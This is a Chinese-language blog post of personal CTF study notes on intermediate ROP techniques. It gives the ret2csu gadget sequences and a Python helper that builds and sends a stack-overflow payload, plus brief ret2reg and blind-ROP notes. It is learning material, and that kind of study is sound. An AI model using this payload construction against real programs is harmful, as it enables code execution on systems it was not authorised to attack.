---
layout: post
title: Pwn-intermedia-rop
date: 2020-04-29 18:17:55
categories: pwn
---

# 中级ROP

## ret2csu

### 原理

我的个人理解是巧妙的利用了64位程序中libc库的 `__libc__csu_init` 函数的几个 gadgets ,从而达到控制程序流程的目的。
见 ctf-wiki 的 [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#ret2csu)

### 例子

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#_2)

总结一下：(以下只是示例，具体情况要具体分析)  
首先利用结尾处的  

```c
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
retn
```

设置这 6 个寄存器。
然后利用前面的  

```c
mov rdx, r15;
mov rsi, r14;
mov r13d, edi;
call [r12+rbx*8];
add rbx, 1;
cmp rbx, rbp;
jnz short loc_4005f0
add rsp, 8
``` 

设置 rdx,rsi,和edi 来传递参数，通过控制 r12指向目标函数和 rbx为0来实现调用目标函数。然后控制 rbp 为1，使跳转失效。

所以可以给出一个通用的调用过程：

```python
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp # 0x80 is the offset of buffer
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


csu(0,1,func_addr,arg1,arg2,arg3,ret_addr)
```

注意：这一套gadgets输入的字节长度为 128，限制比较大。

### 题目

仅仅使用目前所学的知识无法解决，暂时放过，后面学了相应的技术后再补上。

## ret2reg

### 原理 

查看溢出函数返回时哪个寄存器值指向溢出缓冲区空间
然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址
reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)

### 例子

暂时没找到，后面遇到再加上

## BROP

参考 [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#blind-rop)
没怎么看懂，后期遇到再补上。